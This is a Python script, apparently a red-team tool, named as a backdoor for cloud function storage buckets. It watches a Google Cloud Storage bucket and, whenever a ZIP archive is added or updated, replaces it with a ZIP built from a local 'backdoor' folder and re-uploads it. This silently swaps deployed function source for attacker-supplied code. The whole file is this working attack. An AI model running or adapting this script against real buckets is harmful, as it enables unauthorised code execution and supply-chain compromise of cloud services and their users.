import os
import sys
import time
import zipfile
import shutil
from google.cloud import storage
from distutils.dir_util import copy_tree

# Capture the bucket name from command line arguments
if len(sys.argv) < 2:
    print("Usage: python backdoor_cf_bucket.py <bucket_name>")
    sys.exit(1)

bucket_name = sys.argv[1]
print("Checking bucket:", bucket_name)

# Initialize the GCS client
client = storage.Client()
bucket = client.get_bucket(bucket_name)

def list_blobs():
    """List all blobs in the bucket and their metadata."""
    blobs = bucket.list_blobs()
    return {blob.name: blob.updated for blob in blobs}

def handle_zip_file(zip_name, local_folder_root):
    """Handle local folder operations and re-upload the ZIP file."""
    
    new_folder = zip_name[:-4]
    os.makedirs(new_folder, exist_ok=True)
    copy_tree(local_folder_root, new_folder)    

    # Compress the folder into a new ZIP file
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(new_folder):
            for file in files:
                file_path = os.path.join(root, file)
                relative_path = os.path.relpath(file_path, new_folder)
                zipf.write(file_path, relative_path)

    blob = bucket.blob(zip_name)
    blob.upload_from_filename(zip_name)
    print(f"Uploaded new ZIP file: {zip_name}")
    os.remove(zip_name)
    shutil.rmtree(new_folder)


def monitor_bucket():
    """Monitor the bucket for changes."""
    print("Monitoring bucket for changes...")
    local_folder_root = './backdoor'
    last_state = list_blobs()
    processed_files = {}
    print(f"Initial state:")
    for file_name, updated in last_state.items():
        print(f"File: {file_name}, Updated: {updated}")

    while True:
        current_state = list_blobs()
        modified_files = []

        # Check for added or updated files
        for file_name, updated in current_state.items():
            if file_name.endswith('.zip'):
                last_updated = last_state.get(file_name)
                # File is new or updated
                if (file_name not in last_state) or (updated != last_updated):
                    # Check if we have already processed this update
                    processed_updated = processed_files.get(file_name)
                    if (processed_updated is None) or (updated > processed_updated):
                        # If last_updated exists, calculate time difference
                        if last_updated:
                            time_diff = (updated - last_updated).total_seconds()
                            if time_diff <= 20:
                                # Update processed_files but don't upload
                                processed_files[file_name] = updated
                                print(f"File {file_name} updated within 20 seconds, skipping upload.")
                                continue
                        # Proceed to handle the file
                        modified_files.append(file_name)
        # Handle added or updated ZIP files
        if modified_files:
            print("Change detected in bucket!")
            for file in modified_files:
                print(f"Updated file: {file}")
                handle_zip_file(file, local_folder_root)
                # Update the processed_files with the latest updated time
                processed_files[file] = current_state[file_name]

        # Update last known state
        last_state = current_state.copy()

        time.sleep(5)  # Add a sleep interval to prevent tight looping

if __name__ == '__main__':
    monitor_bucket()
